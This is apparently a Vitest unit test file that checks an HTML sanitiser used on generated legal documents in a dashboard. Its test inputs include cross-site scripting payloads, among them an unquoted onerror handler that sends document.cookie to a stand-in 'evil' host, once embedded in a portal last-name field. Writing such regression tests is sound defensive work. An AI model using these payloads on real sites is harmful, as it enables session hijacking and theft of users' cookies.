/**
 * Unit Tests — sanitiseHtml (src/api/routes/employment-intake.ts)
 *
 * This is the shared last-line-of-defense on every generated document
 * rendered in the dashboard via dangerouslySetInnerHTML. The 2026-07-14
 * security review found it passed unquoted event handlers and javascript:
 * URIs; these tests lock the closed vectors, including the exact payload
 * that could reach it through the public intake portal.
 */

import { describe, it, expect } from 'vitest';
import { sanitiseHtml } from '../../src/api/routes/employment-intake.js';

describe('sanitiseHtml — active-content stripping', () => {
  it('strips quoted event handlers', () => {
    expect(sanitiseHtml('<div onclick="steal()">x</div>')).not.toMatch(/onclick/i);
  });

  it('strips UNQUOTED event handlers (the review finding)', () => {
    const out = sanitiseHtml('<img src=x onerror=fetch("//evil/"+document.cookie)>');
    expect(out).not.toMatch(/onerror/i);
  });

  it('strips single-quoted event handlers', () => {
    expect(sanitiseHtml("<svg onload='alert(1)'>")).not.toMatch(/onload/i);
  });

  it('removes script, iframe, object, embed tags', () => {
    expect(sanitiseHtml('<script>alert(1)</script>')).not.toMatch(/<script/i);
    expect(sanitiseHtml('<iframe src="//evil"></iframe>')).not.toMatch(/<iframe/i);
    expect(sanitiseHtml('<object data="x"></object>')).not.toMatch(/<object/i);
    expect(sanitiseHtml('<embed src="x">')).not.toMatch(/<embed/i);
  });

  it('neutralizes javascript: and data: URIs in href/src', () => {
    expect(sanitiseHtml('<a href="javascript:alert(1)">x</a>')).not.toMatch(/javascript:/i);
    expect(sanitiseHtml('<a href=javascript:alert(1)>x</a>')).not.toMatch(/javascript:/i);
    expect(sanitiseHtml('<img src="data:text/html,<script>">')).not.toMatch(/data:text\/html/i);
  });

  it('neutralizes the exact intake-portal payload against the mediation-brief title', () => {
    // A client-controlled last name submitted through the public portal.
    const lastName = 'Smith<img src=x onerror=fetch("//evil/"+document.cookie)>';
    const title = `<h1>Mediation Brief of the Plaintiff, Dana ${lastName}</h1>`;
    const out = sanitiseHtml(title);
    expect(out).not.toMatch(/onerror/i);
  });

  it('preserves legitimate generated markup', () => {
    const doc = '<h1>Brief</h1>\n<h2>Overview</h2>\n<p>1.&nbsp;&nbsp;Facts.</p>\n<table><tr><th>A</th><td>B</td></tr></table>';
    const out = sanitiseHtml(doc);
    expect(out).toContain('<h1>Brief</h1>');
    expect(out).toContain('<table>');
    expect(out).toContain('<p>1.&nbsp;&nbsp;Facts.</p>');
  });
});
